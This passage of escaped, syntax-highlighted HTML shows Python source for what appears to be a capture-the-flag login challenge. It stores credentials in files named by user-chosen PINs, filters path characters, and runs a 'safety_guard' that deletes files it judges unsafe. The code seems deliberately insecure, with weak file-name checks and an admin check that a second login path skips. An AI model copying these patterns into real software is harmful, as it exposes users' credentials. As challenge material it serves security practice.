style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;too long...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e password\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;utf8\u0026#34;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x7e\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;printable chars only!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e flag:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(pin, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ewrite(username \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e password)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;saved!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eOSError\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;pin is invalid!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003esafety_guard\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;safety guard activated. will delete all unsafe credentials hahaha...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    delete_file \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e []\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e pin \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003elistdir(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;.\u0026#34;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        safe \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(pin, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(data) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                safe \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e len(data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e len(data[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]) \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                safe \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                safe \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                safe \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e safe \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            os\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eremove(pin)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            delete_file\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(pin)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;finished. delete \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003elen(delete_file)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e unsafe credentials: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003edelete_file\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efast_login\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        pin \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter a pin code \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(pin) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;too long...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\\\\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;..\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;what do you want to do?(¬_¬)\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e pin\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eencode(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;utf8\u0026#34;\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x7e\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eor\u003c/span\u003e c \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;printable chars only!!\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                flag \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e flag:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003etry\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ewith\u003c/span\u003e open(pin, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;r\u0026#34;\u003c/span\u003e) \u003cspan style=\"color:#66d9ef\"\u003eas\u003c/span\u003e f:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            data \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e f\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eread()\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esplit(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e\\n\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(data) \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;unknown error happened??\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e data[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e], data[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eexcept\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eFileNotFoundError\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;this pin code is not registered.\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003eNone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003enormal_login\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        username \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter username \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(username) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;too long...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e username\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;strange username, huh?\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e username \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;admin\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;no you are definitely not (╬ Ò ‸ Ó)\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        password \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter password \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e len(password) \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;too long...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003econtinue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e password\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eisalnum() \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eFalse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;strange password, huh?\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelse\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e username, password\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003elogin\u003c/span\u003e():\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    safety_guard()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eTrue\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1. fast login\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2. normal login\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3. exit\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;enter login type \u0026gt; \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;1\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            username, password \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e fast_login()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;2\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            username, password \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e normal_login()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003eelif\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;3\u0026#34;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan 